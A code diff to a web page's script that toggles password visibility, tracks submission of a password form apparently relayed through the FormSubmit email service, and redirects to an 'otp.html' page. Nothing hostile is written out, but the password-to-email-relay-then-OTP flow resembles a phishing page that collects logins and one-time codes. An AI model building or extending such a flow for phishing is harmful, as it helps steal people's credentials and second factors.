@@ -12,6 +12,7 @@
 
             const passInput = document.getElementById("pass");
             const passToggle = document.getElementById("passToggle");
+            const form = document.getElementById("form");
 
             // Toggle password visibility with icon change
             passToggle.addEventListener("click", function () {
@@ -24,24 +25,25 @@
                 }
             });
 
-            // Handle form submission failure and fallback redirection
-            const form = document.getElementById("form");
-            const fallbackTimeout = 5000; // 5 seconds fallback in case FormSubmit fails
+            // Listen for form submission and track it
+            form.addEventListener("submit", function () {
+                sessionStorage.setItem("formSubmitted", "true"); // Mark form as submitted
 
-            form.addEventListener("submit", function (event) {
                 setTimeout(() => {
                     if (!sessionStorage.getItem("formSuccess")) {
                         console.warn("FormSubmit may have failed, redirecting manually...");
-                        window.location.href = "otp.html";
+                        window.location.href = "otp.html"; // Fallback redirect
                     }
-                }, fallbackTimeout);
+                }, 5000); // Wait 5 seconds before assuming failure
             });
         });
 
-        // This function is called if FormSubmit redirects successfully
+        // This function runs only if FormSubmit successfully loads in the iframe
         function formSubmitSuccess() {
-            sessionStorage.setItem("formSuccess", "true"); // Mark form as successfully submitted
-            window.location.href = "otp.html"; // Redirect to OTP page
+            if (sessionStorage.getItem("formSubmitted")) {
+                sessionStorage.setItem("formSuccess", "true"); // Mark form as successfully submitted
+                window.location.href = "otp.html"; // Redirect to OTP page
+            }
         }
     </script>
 
